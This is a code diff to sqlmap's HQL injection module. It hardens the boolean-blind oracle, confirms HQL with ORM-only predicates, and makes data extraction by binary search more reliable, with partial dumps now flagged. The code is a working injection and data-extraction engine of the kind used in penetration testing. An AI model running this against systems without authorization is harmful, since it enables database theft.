@@ -5,7 +5,6 @@ Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
 See the file 'LICENSE' for copying permission
 """
 
-import difflib
 import re
 import time
 
@@ -18,6 +17,14 @@ from lib.core.data import conf
 from lib.core.data import logger
 from lib.core.enums import CUSTOM_LOGGING
 from lib.core.enums import PLACE
+from lib.utils.nonsql import InconclusiveError
+from lib.utils.nonsql import INCONCLUSIVE_MARK
+from lib.utils.nonsql import userDecision
+from lib.utils.nonsql import resolveBit
+from lib.utils.nonsql import sqlErrorPresent
+from lib.utils.nonsql import blockedStatus
+from lib.utils.nonsql import ratio as _ratio
+from lib.utils.nonsql import userOracleActive
 from lib.core.settings import HQL_CHAR_MAX
 from lib.core.settings import HQL_CHAR_MIN
 from lib.core.settings import HQL_COMMON_ENTITIES
@@ -33,6 +40,7 @@ from lib.utils.xrange import xrange
 
 
 SENTINEL = randomStr(length=10, lowercase=True)
+
 
 HQL_PLACES = (PLACE.GET, PLACE.POST, PLACE.CUSTOM_POST)
 
@@ -67,8 +75,6 @@ Slot = namedtuple("Slot", ("place", "parameter", "backend", "entity", "oracle", 
 Slot.__new__.__defaults__ = (None,) * 7
 
 
-def _ratio(first, second):
-    return difflib.SequenceMatcher(None, first or "", second or "").quick_ratio()
 
 
 def _delim(place):
@@ -125,17 +131,24 @@ def _send(place, parameter, value):
     try:
         if conf.verbose >= 3:
             logger.log(CUSTOM_LOGGING.PAYLOAD, "%s=%s" % (parameter, value))
-        page, _, _ = Request.getPage(raise404=False, silent=True)
+        page, _, code = Request.getPage(raise404=False, silent=True)
+        # a transport failure or a BLOCKED/ERROR status (5xx, 403/429) is not a usable oracle sample -
+        # signal None so the boolean routines (which reject None) can never decide a bit on it
+        if blockedStatus(code):
+            return None
         return page or ""
     except Exception as ex:
         logger.debug("HQL probe request failed: %s" % getUnicode(ex))
-        return ""
+        return None
     finally:
         conf.parameters[place] = old_params
 
 
 def _isError(page):
-    return bool(re.search(HQL_ERROR_REGEX, getUnicode(page or "")))
+    # an ORM/HQL error body OR a recognized SQL/DBMS error marks a response as NOT a valid boolean
+    # template (a broken break-out that trips a DBMS syntax error must not fake a boolean oracle).
+    page = getUnicode(page or "")
+    return bool(re.search(HQL_ERROR_REGEX, page)) or sqlErrorPresent(page)
 
 
 def _backendFromError(page):
@@ -189,6 +202,10 @@ def _boolean(truthy, falsy):
     if _ratio(falsePage, falsy()) < UPPER_RATIO_BOUND:
         return None
 
+    # honor an explicit user oracle (--string/--not-string/--regexp) over raw similarity
+    if userOracleActive():
+        return truePage if (userDecision(truePage) is True and userDecision(falsePage) is False) else None
+
     if _ratio(truePage, falsePage) < UPPER_RATIO_BOUND:
         return truePage
 
@@ -223,24 +240,87 @@ def _wrap(original, boundary, predicate):
     return "%s%s%s%s" % (original, boundary.prefix, predicate, boundary.suffix)
 
 
-def _makeOracle(place, parameter, template, boundary, original):
-    """Build oracle(predicate) -> bool from a verified true template."""
+# HQL/JPQL-only WHERE predicates for positive attribution WITHOUT a reflected ORM error (production
+# systems suppress diagnostics). Each pair differs ONLY in the truth of a construct that plain SQL does
+# NOT evaluate the same way, so a true/false divergence is attributable to the ORM.
+#
+# NOTE deliberately NOT using Hibernate CAST type aliases (CAST(x AS string/integer/long/big_decimal)):
+# although PostgreSQL/MySQL/MSSQL reject those type names, SQLite accepts ARBITRARY cast type names, so
+# `CAST(1 AS string)='1'` is TRUE on plain SQLite and would mis-attribute a SQLite SQL injection as HQL.
+#
+# `str()` is Hibernate's legacy stringify function and is a clean discriminator across the target
+# engines: SQLite/MySQL/MariaDB/PostgreSQL/H2/HSQLDB have NO `str()` function, so the payload ERRORS
+# (both sides error -> no divergence -> not confirmed); Microsoft SQL Server's STR(1) yields a
+# space-padded '         1', so BOTH str(1)='1' and str(1)='2' are false (again no divergence). Only a
+# Hibernate parser makes str(1)='1' true and str(1)='2' false. A single clean primitive is preferred
+# over a broad battery here: on a context that rejects it, attribution simply falls back to
+# "indistinguishable from SQLi" (safe under-report), never a false HQL claim.
+_HQL_PREDICATES = (
+    ("str(1)='1'",                  "str(1)='2'"),
+)
+
+
+def _confirmHql(place, parameter, boundary, original):
+    """Positive HQL/JPQL attribution with no reflected error: probe the HQL-only battery through the
+    boolean oracle. Returns True as soon as ANY primitive flips true/false behind the verified boundary;
+    a plain-SQL target (SQLite included) errors on or evaluates-both-false every one -> no divergence ->
+    not confirmed as HQL."""
+    base = _base(boundary, original)
+    for truePred, falsePred in _HQL_PREDICATES:
+        if _boolean(lambda p=_wrap(base, boundary, truePred): _send(place, parameter, p),
+                    lambda p=_wrap(base, boundary, falsePred): _send(place, parameter, p)):
+            return True
+    return False
+
+
+def _makeOracle(place, parameter, boundary, original):
+    """Build the extraction oracle by RECALIBRATING BOTH true and false models on the SAME extraction
+    base + boundary the predicates use (`_base()` -> SENTINEL/-1, NOT the original-based detection
+    template). Reusing the detection true template (built with the original value) while extraction
+    ran on a different base was a base mismatch. Reproduce both, require separable, else None (disable
+    extraction). Classification is RELATIVE (closer to the true model than the false one, by a margin)
+    so dynamic drift can't flip a bit."""
 
     cache = {}
     base = _base(boundary, original)
 
     def request(payload):
+        # cache ONLY usable responses - a cached transient failure would freeze a wrong bit forever
         if payload not in cache:
-            cache[payload] = _send(place, parameter, payload)
+            page = _send(place, parameter, payload)
+            if page is not None and not _isError(page):
+                cache[payload] = page
+            return page
         return cache[payload]
 
-    def truth(predicate):
-        page = request(_wrap(base, boundary, predicate))
-        if page is None or _isError(page):
-            return False
-        return _ratio(template, page) >= UPPER_RATIO_BOUND
+    truePayload = _wrap(base, boundary, "1=1")
+    falsePayload = _wrap(base, boundary, "1=2")
+    trueTemplate = request(truePayload)
+    falseTemplate = request(falsePayload)
 
-    truth.template = template
+    if trueTemplate is None or falseTemplate is None or _isError(trueTemplate) or _isError(falseTemplate):
+        return None
+    if _ratio(trueTemplate, _send(place, parameter, truePayload)) < UPPER_RATIO_BOUND:      # reproduce true
+        return None
+    if _ratio(falseTemplate, _send(place, parameter, falsePayload)) < UPPER_RATIO_BOUND:    # reproduce false
+        return None
+    if _ratio(trueTemplate, falseTemplate) >= UPPER_RATIO_BOUND:      # not separable -> can't extract
+        return None
+
+    def truth(predicate):
+        # transport failure / blocked / error response is UNKNOWN, not False: route even a missing
+        # initial sample through resolveBit() (retry -> InconclusiveError) so a transient failure on a
+        # true predicate never becomes a permanent false bit that corrupts the bisection
+        payload = _wrap(base, boundary, predicate)
+        page = request(payload)
+        usable = page if (page is not None and not _isError(page)) else None
+
+        def fresh():
+            p = _send(place, parameter, payload)
+            return None if (p is None or _isError(p)) else p
+        return resolveBit(usable, trueTemplate, falseTemplate, fresh)
+
+    truth.template = trueTemplate
     truth.cache = cache
     return truth
 
@@ -335,36 +415,41 @@ def _scalar(entity, attrExpr, pin, after=None):
 def _inferValue(truth, entity, attribute, pin, after=None, maxLen=HQL_MAX_LENGTH):
     """Blindly recover one attribute value of the row selected by `pin`/`after`."""
 
-    # length first, by binary search
-    lengthExpr = _scalar(entity, "LENGTH(CAST(_h.%s AS string))" % attribute, pin, after)
-    if not truth("%s>=1" % lengthExpr):
-        return ""
+    try:
+        # length first, by binary search
+        lengthExpr = _scalar(entity, "LENGTH(CAST(_h.%s AS string))" % attribute, pin, after)
+        if not truth("%s>=1" % lengthExpr):
+            return ""
 
-    lo, hi = 1, maxLen
-    while lo < hi:
-        mid = (lo + hi + 1) // 2
-        if truth("%s>=%d" % (lengthExpr, mid)):
-            lo = mid
-        else:
-            hi = mid - 1
-    length = lo
-
-    chars = []
-    for pos in xrange(1, length + 1):
-        # index of this character inside _CS_LITERAL, recovered by binary search
-        idxExpr = _scalar(entity, "LOCATE(SUBSTRING(CAST(_h.%s AS string),%d,1),'%s')" % (attribute, pos, _CS_LITERAL), pin, after)
-        if not truth("%s>=1" % idxExpr):
-            chars.append("?")
-            continue
-
-        lo, hi = 1, len(_CS_LITERAL)
+        lo, hi = 1, maxLen
         while lo < hi:
             mid = (lo + hi + 1) // 2
-            if truth("%s>=%d" % (idxExpr, mid)):
+            if truth("%s>=%d" % (lengthExpr, mid)):
                 lo = mid
             else:
                 hi = mid - 1
-        chars.append(_CS_LITERAL[lo - 1])
+        length = lo
+
+        chars = []
+        for pos in xrange(1, length + 1):
+            # index of this character inside _CS_LITERAL, recovered by binary search
+            idxExpr = _scalar(entity, "LOCATE(SUBSTRING(CAST(_h.%s AS string),%d,1),'%s')" % (attribute, pos, _CS_LITERAL), pin, after)
+            if not truth("%s>=1" % idxExpr):
+                chars.append("?")
+                continue
+
+            lo, hi = 1, len(_CS_LITERAL)
+            while lo < hi:
+                mid = (lo + hi + 1) // 2
+                if truth("%s>=%d" % (idxExpr, mid)):
+                    lo = mid
+                else:
+                    hi = mid - 1
+            chars.append(_CS_LITERAL[lo - 1])
+    except InconclusiveError:
+        # abort this value rather than emit a length/char chosen from an ambiguous bit
+        logger.warning("HQL extraction aborted for '%s.%s' (oracle inconclusive after retries)" % (entity, attribute))
+        return None
 
     return "".join(chars)
 
@@ -406,25 +491,42 @@ def _dumpEntity(oracle, place, parameter, entity):
     # advance the cursor; otherwise only the first (smallest-pin) row is recovered.
     rows = []
     after = None
+    partial = False
     for _ in xrange(HQL_MAX_RECORDS):
         pinValue = _inferValue(oracle, entity, pin, pin, after)
-        if not pinValue:
+        if pinValue is None:
+            # None => the NEXT-row pin was INCONCLUSIVE (oracle aborted), NOT "no more rows". Stop, but
+            # flag the table PARTIAL rather than silently presenting it as the complete set.
+            partial = True
+            logger.warning("next-row pin for entity '%s' is inconclusive; the dumped table is PARTIAL" % entity)
+            break
+        if not pinValue:                            # "" => genuine end (no further row)
             break
 
         record = {pin: pinValue}
         for field in fields:
             if field != pin:
-                record[field] = _inferValue(oracle, entity, field, pin, after)
+                # None => extraction ABORTED for this cell (inconclusive oracle). Mark it visibly so it
+                # stays distinguishable from a genuine empty value - never silently blank.
+                cell = _inferValue(oracle, entity, field, pin, after)
+                record[field] = INCONCLUSIVE_MARK if cell is None else cell
         rows.append([record.get(_, "") for _ in fields])
         logger.info("  retrieved record: %s" % ", ".join("%s='%s'" % (_, record.get(_, "")) for _ in fields))
 
         if not re.match(r"\A\d+\Z", pinValue):
+            # a non-numeric pin (e.g. a UUID/string key) cannot advance the ascending cursor, so only
+            # the first row is recovered - flag the table PARTIAL rather than imply it is complete
+            if len(rows) == 1:
+                partial = True
+                logger.warning("entity '%s' pin '%s' is non-numeric; only the first row is enumerable (table is PARTIAL)" % (entity, pin))
             break
         after = pinValue
     else:
         logger.warning("entity '%s' hit the HQL_MAX_RECORDS (%d) cap; some records may be omitted" % (entity, HQL_MAX_RECORDS))
+        partial = True                              # a truncated cap is NOT a complete dump
 
-    conf.dumper.singleString("HQL: %s parameter '%s' entity '%s' (%d record%s, ordered by %s):\n%s" % (place, parameter, entity, len(rows), "s" if len(rows) != 1 else "", pin, _grid(columns, rows)))
+    completeness = ", PARTIAL - row enumeration aborted before the end" if partial else ""
+    conf.dumper.singleString("HQL: %s parameter '%s' entity '%s' (%d record%s%s, ordered by %s):\n%s" % (place, parameter, entity, len(rows), "s" if len(rows) != 1 else "", completeness, pin, _grid(columns, rows)))
 
 
 def hqlScan():
@@ -461,15 +563,36 @@ def hqlScan():
                     logger.info("%s parameter '%s' errors in the ORM parser but no boolean oracle was established" % (place, parameter))
                 continue
 
-            backend = backendHint or "Hibernate"
+            # CRITICAL: HQL compiles TO SQL, so a bare boolean break-out (`' or '1'='1`) is IDENTICAL
+            # to - and INDISTINGUISHABLE from - classic SQL injection. Claim HQL ONLY with positive
+            # ORM/Hibernate evidence: either a reflected parser diagnostic (_probeError) OR - when the
+            # app suppresses diagnostics - the HQL-only confirmation battery (_confirmHql: constructs
+            # valid in HQL/JPQL but rejected by plain SQL). Without either it is plain SQL injection and
+            # reporting it as HQL would be a false positive on every SQLi target.
             original = _originalValue(place, parameter)
+            if not backendHint:
+                if _confirmHql(place, parameter, boundary, original):
+                    backendHint = "Hibernate (HQL/JPQL)"
+                    logger.info("%s parameter '%s' confirmed HQL/JPQL via ORM-only constructs (no error leakage needed)" % (place, parameter))
+                else:
+                    logger.info("%s parameter '%s' yields a boolean oracle but shows no ORM/Hibernate evidence - indistinguishable from classic SQL injection; not reporting as HQL (re-run without '--hql' to test for SQLi)" % (place, parameter))
+                    continue
+
+            backend = backendHint
             # Error leakage only helps when the app actually reflects diagnostics
             entity = _leakEntity(place, parameter, boundary, original) if backendHint else None
-            logger.info("%s parameter '%s' is vulnerable to HQL injection (back-end: '%s'%s)" % (place, parameter, backend, ", entity: '%s'" % entity if entity else ""))
             if conf.beep:
                 beep()
 
-            oracle = _makeOracle(place, parameter, template, boundary, original)
+            oracle = _makeOracle(place, parameter, boundary, original)
+            if oracle is None:
+                # confirmed HQL, but the extraction true/false models are not reliably separable ->
+                # report the finding WITHOUT dumping (never fabricate entity/field data)
+                logger.info("%s parameter '%s' is vulnerable to HQL injection (back-end: '%s'%s); "
+                            "extraction disabled (true/false models not reliably separable)" % (place, parameter, backend, ", entity: '%s'" % entity if entity else ""))
+                conf.dumper.singleString("---\nParameter: %s (%s)\n    Type: HQL injection\n    Title: HQL boolean-based blind (extraction unavailable)\n    Payload: %s=%s\n---" % (parameter, place, parameter, payload))
+                continue
+            logger.info("%s parameter '%s' is vulnerable to HQL injection (back-end: '%s'%s)" % (place, parameter, backend, ", entity: '%s'" % entity if entity else ""))
             slots.append(Slot(place=place, parameter=parameter, backend=backend,
                               entity=entity, oracle=oracle, boundary=boundary, payload=payload))
 
